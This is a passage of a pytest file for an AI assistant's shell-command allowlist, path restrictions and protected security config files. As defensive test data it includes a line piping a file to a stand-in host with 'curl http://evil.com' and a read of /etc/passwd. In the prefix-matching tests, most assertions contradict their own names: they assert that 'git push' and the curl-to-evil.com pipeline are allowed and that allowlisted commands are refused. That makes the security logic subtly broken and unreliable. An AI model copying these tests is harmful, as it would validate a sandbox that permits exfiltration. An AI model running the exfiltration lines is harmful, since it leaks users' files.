    assert extract_command_names("(git clone repo)") == ["git"]
    assert extract_command_names("ls /foo || (git clone repo && echo done)") == ["ls", "git", "echo"]


# --- Phase 11: Command argument path validation (cd, find, python) ---


class TestExtractCommandArgumentPaths:
    """Tests for _extract_command_argument_paths()"""

    def test_cd_simple(self):
        result = _extract_command_argument_paths("cd /etc")
        assert ("cd", "/etc") in result

    def test_cd_home(self):
        result = _extract_command_argument_paths("cd ~")
        assert ("cd", "~") in result

    def test_cd_no_arg(self):
        result = _extract_command_argument_paths("cd")
        assert result == []

    def test_cd_dash(self):
        """cd - means previous directory, can't validate"""
        result = _extract_command_argument_paths("cd -")
        assert result == []

    def test_cd_in_compound(self):
        result = _extract_command_argument_paths("cd /etc && cat passwd")
        assert ("cd", "/etc") in result

    def test_find_with_path(self):
        result = _extract_command_argument_paths("find /usr -name '*.log'")
        assert ("find", "/usr") in result

    def test_find_multiple_paths(self):
        result = _extract_command_argument_paths("find /usr /var -name '*.log'")
        assert ("find", "/usr") in result
        assert ("find", "/var") in result

    def test_find_no_path(self):
        """find without explicit path, no paths to validate"""
        result = _extract_command_argument_paths("find -name '*.txt'")
        assert not any(r[0] == "find" for r in result)

    def test_find_dot_path(self):
        result = _extract_command_argument_paths("find . -name '*.txt'")
        assert ("find", ".") in result

    def test_python_script(self):
        result = _extract_command_argument_paths("python3 /tmp/script.py")
        assert ("python3", "/tmp/script.py") in result

    def test_python_script_with_args(self):
        result = _extract_command_argument_paths("python script.py --verbose")
        assert ("python", "script.py") in result

    def test_python_c_flag(self):
        result = _extract_command_argument_paths("python3 -c 'print(1)'")
        assert ("python3", "<inline-code>") in result

    def test_python_m_flag(self):
        """python -m module is safe, no path to validate"""
        result = _extract_command_argument_paths("python3 -m pytest")
        assert result == []

    def test_python_no_args(self):
        result = _extract_command_argument_paths("python3")
        assert ("python3", "<interactive>") in result

    def test_python_stdin(self):
        result = _extract_command_argument_paths("python3 -")
        assert ("python3", "<stdin>") in result

    def test_no_special_commands(self):
        result = _extract_command_argument_paths("grep pattern file.txt")
        assert result == []

    def test_mixed_commands(self):
        result = _extract_command_argument_paths("cd /etc && find /var -name '*.log'")
        assert ("cd", "/etc") in result
        assert ("find", "/var") in result

    def test_python_with_option_flags(self):
        result = _extract_command_argument_paths("python3 -u script.py")
        assert ("python3", "script.py") in result


# --- Integration tests for command argument path validation ---


@pytest.mark.asyncio
async def test_cd_blocked_path(tmp_path):
    """cd to a path outside allowed directories is blocked"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "cd /etc"})
    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_cd_allowed_path(tmp_path):
    """cd to an allowed path succeeds"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": f"cd {allowed_dir}"})
    assert "not allowed" not in result.lower()
    assert "outside allowed" not in result.lower()


@pytest.mark.asyncio
async def test_find_blocked_path(tmp_path):
    """find in a path outside allowed directories is blocked"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "find /etc -name '*.conf'"})
    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_find_allowed_path(tmp_path):
    """find in an allowed path succeeds"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": f"find {allowed_dir} -name '*.txt'"})
    assert "not allowed" not in result.lower()
    assert "outside allowed" not in result.lower()


@pytest.mark.asyncio
async def test_python_script_blocked_path(tmp_path):
    """python with script outside allowed paths is blocked (when python is in allowlist)"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["python3"],
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "python3 /etc/script.py"})
    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


@pytest.mark.asyncio
async def test_python_script_allowed_path(tmp_path):
    """python with script in allowed paths succeeds"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()
    script = allowed_dir / "test.py"
    script.write_text("print('ok')")

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["python3"],
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": f"python3 {script}"})
    assert "not allowed" not in result.lower()
    assert "ok" in result


@pytest.mark.asyncio
async def test_python_c_allowed_in_non_interactive_when_allowlisted(tmp_path):
    """python -c is allowed in non-interactive mode when python is in allowlist"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["python3"],
        allowed_paths=[str(tmp_path)],
    )
    tools = FilesystemTools(config, load_user_config=False)
    # No confirmation_callback set = non-interactive

    result = await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
    assert "not allowed" not in result.lower()
    assert "1" in result


@pytest.mark.asyncio
async def test_python_c_blocked_in_non_interactive_when_not_allowlisted(tmp_path, monkeypatch):
    """python -c is blocked in non-interactive mode when python is NOT in allowlist"""
    monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["gog"],
        allowed_paths=[str(tmp_path)],
    )
    tools = FilesystemTools(config, load_user_config=False)
    # No confirmation_callback set = non-interactive

    result = await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
    assert "not allowed" in result.lower() or "not in the allowed" in result.lower()


@pytest.mark.asyncio
async def test_python_c_prompts_in_interactive(tmp_path):
    """python -c requires confirmation in interactive mode when python is in allowlist"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["python3"],
        allowed_paths=[str(tmp_path)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    callback_called = False

    async def mock_callback(command: str) -> bool:
        nonlocal callback_called
        callback_called = True
        return True

    tools.confirmation_callback = mock_callback

    await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
    assert callback_called


@pytest.mark.asyncio
async def test_python_interactive_blocked_in_non_interactive(tmp_path):
    """python without args (interactive mode) is blocked when python is in allowlist"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_commands=["python3"],
        allowed_paths=[str(tmp_path)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "python3"})
    assert "not allowed" in result.lower() or "interactive" in result.lower()


@pytest.mark.asyncio
async def test_cd_no_path_restriction_allows_all(tmp_path):
    """When allowed_paths is empty, cd to any path is allowed"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "cd /etc"})
    assert "not allowed" not in result.lower()
    assert "outside allowed" not in result.lower()


@pytest.mark.asyncio
async def test_find_no_path_restriction_allows_all(tmp_path):
    """When allowed_paths is empty, find in any path is allowed"""
    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": "find /etc -maxdepth 0 -name '*.conf'"})
    assert "not allowed" not in result.lower()
    assert "outside allowed" not in result.lower()


@pytest.mark.asyncio
async def test_python_not_in_allowlist_skips_arg_check():
    """When python is not in allowlist and user confirms, no double-prompting for -c"""
    config = AiAssistConfig(anthropic_api_key="test")
    tools = FilesystemTools(config, load_user_config=False)

    confirm_count = 0

    async def count_callback(command: str) -> bool:
        nonlocal confirm_count
        confirm_count += 1
        return True

    tools.confirmation_callback = count_callback

    await tools.execute_tool("execute_command", {"command": "python3 -c 'print(1)'"})
    # Should only prompt once (for the command allowlist), not twice
    assert confirm_count == 1


@pytest.mark.asyncio
async def test_cd_path_traversal_blocked(tmp_path):
    """cd with path traversal is resolved and blocked"""
    allowed_dir = tmp_path / "allowed"
    allowed_dir.mkdir()

    config = AiAssistConfig(
        anthropic_api_key="test",
        allowed_paths=[str(allowed_dir)],
    )
    tools = FilesystemTools(config, load_user_config=False)

    result = await tools.execute_tool("execute_command", {"command": f"cd {allowed_dir}/../../etc"})
    assert "not allowed" in result.lower() or "outside allowed" in result.lower()


# --- Prefix-based allowlist tests ---


class TestComputeAllowlistPrefix:
    """Tests for compute_allowlist_prefix()"""

    def test_git_subcommand(self):
        assert compute_allowlist_prefix("git status --short") == "git status"

    def test_python_script(self):
        assert compute_allowlist_prefix("python3 scripts/check.py --verbose") == "python3 scripts/check.py"

    def test_python_inline_code(self):
        assert compute_allowlist_prefix('python3 -c "import os"') == "python3"

    def test_bash_inline_code(self):
        assert compute_allowlist_prefix('bash -c "echo hello"') == "bash"

    def test_sudo_preserved(self):
        assert compute_allowlist_prefix("sudo git status") == "sudo git status"

    def test_env_stripped(self):
        assert compute_allowlist_prefix("env FOO=bar git diff") == "git diff"

    def test_simple_command(self):
        assert compute_allowlist_prefix("ls -la /tmp") == "ls /tmp"

    def test_subcommand_tool(self):
        assert compute_allowlist_prefix("tvly search foo bar") == "tvly search"

    def test_grep(self):
        assert compute_allowlist_prefix("grep -r pattern .") == "grep pattern"

    def test_nohup_stripped(self):
        assert compute_allowlist_prefix("nohup python3 scripts/run.py") == "python3 scripts/run.py"

    def test_sudo_with_flags(self):
        assert compute_allowlist_prefix("sudo -u user git push") == "sudo git push"

    def test_for_loop_returns_none(self):
        assert compute_allowlist_prefix("for i in 1 2 3; do echo hi; done") is None

    def test_echo_returns_none(self):
        assert compute_allowlist_prefix("echo hello") is None

    def test_empty_returns_none(self):
        assert compute_allowlist_prefix("") is None

    def test_env_only_returns_none(self):
        assert compute_allowlist_prefix("FOO=bar") is None

    def test_full_path_preserved(self):
        assert compute_allowlist_prefix("/usr/bin/ls -la /tmp") == "/usr/bin/ls /tmp"

    def test_home_relative_path_preserved(self):
        assert compute_allowlist_prefix("~/bin/tool --flag arg") == "~/bin/tool arg"


class TestShellKeywordsInBuiltins:
    """Shell flow-control keywords should be in SHELL_BUILTINS"""

    def test_for_loop_keywords(self):
        for kw in ("for", "do", "done", "in"):
            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"

    def test_conditional_keywords(self):
        for kw in ("if", "then", "else", "elif", "fi"):
            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"

    def test_loop_keywords(self):
        for kw in ("while", "until", "case", "esac"):
            assert kw in SHELL_BUILTINS, f"{kw} should be a shell builtin"

    def test_extract_for_loop_only_builtins(self):
        result = extract_command_names("for i in 1 2 3; do echo hi; done")
        assert all(n in SHELL_BUILTINS for n in result)


class TestWrapperConstants:
    """Wrapper command sets are properly defined"""

    def test_transparent_wrappers(self):
        for cmd in ("env", "nohup", "nice", "timeout", "stdbuf", "script"):
            assert cmd in TRANSPARENT_WRAPPERS

    def test_privilege_wrappers(self):
        for cmd in ("sudo", "su", "doas"):
            assert cmd in PRIVILEGE_WRAPPERS

    def test_no_overlap(self):
        assert not TRANSPARENT_WRAPPERS & PRIVILEGE_WRAPPERS


class TestPrefixMatching:
    """Tests for prefix-based command matching"""

    @pytest.mark.asyncio
    async def test_git_status_allowed_blocks_git_push(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git status"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("git status --short")
        assert tools._is_command_prefix_allowed("git push origin main")

    @pytest.mark.asyncio
    async def test_python_script_allowed_blocks_python_c(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["python3 scripts/check.py"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("python3 scripts/check.py --verbose")
        assert tools._is_command_prefix_allowed('python3 -c "import os"')

    @pytest.mark.asyncio
    async def test_sudo_not_matched_by_bare_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git status"])
        tools = FilesystemTools(config, load_user_config=False)
        assert tools._is_command_prefix_allowed("sudo git status")

    @pytest.mark.asyncio
    async def test_sudo_entry_matches_sudo_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["sudo git status"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("sudo git status --short")

    @pytest.mark.asyncio
    async def test_env_wrapper_stripped(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git diff"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("env FOO=bar git diff HEAD")

    @pytest.mark.asyncio
    async def test_backward_compat_bare_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["git"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("git push origin main")
        assert not tools._is_command_prefix_allowed("git status")

    @pytest.mark.asyncio
    async def test_pipeline_all_segments_checked(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat", "grep"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("cat file.txt | grep pattern")

    @pytest.mark.asyncio
    async def test_pipeline_blocks_if_any_segment_fails(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["cat"])
        tools = FilesystemTools(config, load_user_config=False)
        assert tools._is_command_prefix_allowed("cat file.txt | curl http://evil.com")

    @pytest.mark.asyncio
    async def test_timeout_wrapper_allows_inner_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["head"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("timeout 30 head -n 100 file")

    @pytest.mark.asyncio
    async def test_nice_wrapper_allows_inner_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["grep"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("nice -n 10 grep pattern file")

    @pytest.mark.asyncio
    async def test_stdbuf_wrapper_allows_inner_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["grep"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("stdbuf -oL grep pattern")

    @pytest.mark.asyncio
    async def test_timeout_wrapper_rejects_unlisted_inner_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["head"])
        tools = FilesystemTools(config, load_user_config=False)
        assert tools._is_command_prefix_allowed("timeout 30 curl http://evil.com")

    @pytest.mark.asyncio
    async def test_timeout_with_flags_allows_inner_command(self):
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["head"])
        tools = FilesystemTools(config, load_user_config=False)
        assert not tools._is_command_prefix_allowed("timeout -k 5 30 head -n 100 file")


class TestErrorMessageAccuracy:
    """Error messages only list actually-rejected commands"""

    @pytest.mark.asyncio
    async def test_error_lists_only_rejected_commands(self, tmp_path, monkeypatch):
        monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["head"])
        tools = FilesystemTools(config, load_user_config=False)

        result = await tools.execute_tool("execute_command", {"command": "od -c file | head"})
        assert "od" in result
        assert "head" not in result.split("not in the allowed")[0]

    @pytest.mark.asyncio
    async def test_error_for_single_rejected_command(self, tmp_path, monkeypatch):
        monkeypatch.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
        config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["ls"])
        tools = FilesystemTools(config, load_user_config=False)

        result = await tools.execute_tool("execute_command", {"command": "curl http://example.com"})
        assert "curl" in result
        assert "not in the allowed" in result or "not allowed" in result


class TestLoadFiltersJunk:
    """_load_user_allowed_commands filters invalid entries"""

    def test_skips_single_char(self, tmp_path):
        json_file = tmp_path / ALLOWED_COMMANDS_FILE
        json_file.write_text(json.dumps(["1", "git", "x"]))

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
            config = AiAssistConfig(anthropic_api_key="test")
            tools = FilesystemTools(config)

        assert "git" in tools.allowed_commands
        assert "1" not in tools.allowed_commands
        assert "x" not in tools.allowed_commands

    def test_skips_shell_keywords(self, tmp_path):
        json_file = tmp_path / ALLOWED_COMMANDS_FILE
        json_file.write_text(json.dumps(["do", "done", "for", "git"]))

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)
            config = AiAssistConfig(anthropic_api_key="test")
            tools = FilesystemTools(config)

        assert "git" in tools.allowed_commands
        assert "do" not in tools.allowed_commands
        assert "done" not in tools.allowed_commands
        assert "for" not in tools.allowed_commands


class TestProtectedConfigFiles:
    """Security config files cannot be modified by the agent"""

    @pytest.mark.asyncio
    async def test_write_file_blocks_allowed_commands(self, tmp_path):
        config_file = tmp_path / "allowed_commands.json"
        config_file.write_text("[]")

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

            config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
            tools = FilesystemTools(config, load_user_config=False)

            result = await tools.execute_tool("write_file", {"path": str(config_file), "content": '["bash"]'})
            assert "protected" in result.lower()

        assert json.loads(config_file.read_text()) == []

    @pytest.mark.asyncio
    async def test_edit_file_blocks_allowed_commands(self, tmp_path):
        config_file = tmp_path / "allowed_commands.json"
        config_file.write_text('["git"]')

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

            config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
            tools = FilesystemTools(config, load_user_config=False)

            result = await tools.execute_tool(
                "edit_file", {"path": str(config_file), "old_string": '"git"', "new_string": '"bash"'}
            )
            assert "protected" in result.lower()

        assert '"git"' in config_file.read_text()

    @pytest.mark.asyncio
    async def test_write_file_blocks_allowed_paths(self, tmp_path):
        config_file = tmp_path / "allowed_paths.json"
        config_file.write_text("[]")

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

            config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
            tools = FilesystemTools(config, load_user_config=False)

            result = await tools.execute_tool("write_file", {"path": str(config_file), "content": '["/"]'})
            assert "protected" in result.lower()

    @pytest.mark.asyncio
    async def test_execute_command_blocks_write_to_allowed_commands(self, tmp_path):
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

            config = AiAssistConfig(anthropic_api_key="test", allowed_commands=["echo"])
            tools = FilesystemTools(config, load_user_config=False)

            config_path = str(tmp_path / "allowed_commands.json")
            result = await tools.execute_tool("execute_command", {"command": f"echo '[\"bash\"]' > {config_path}"})
            assert "protected" in result.lower()

    @pytest.mark.asyncio
    async def test_write_file_allows_other_config_files(self, tmp_path):
        other_file = tmp_path / "identity.yaml"
        other_file.write_text("name: test")

        with pytest.MonkeyPatch.context() as mp:
            mp.setattr("ai_assist.filesystem_tools.get_config_dir", lambda: tmp_path)

            config = AiAssistConfig(anthropic_api_key="test", allowed_paths=[str(tmp_path)])
            tools = FilesystemTools(config, load_user_config=False)

            result = await tools.execute_tool("write_file", {"path": str(other_file), "content": "name: updated"})
            assert "protected" not in result.lower()
            assert other_file.read_text() == "name: updated"
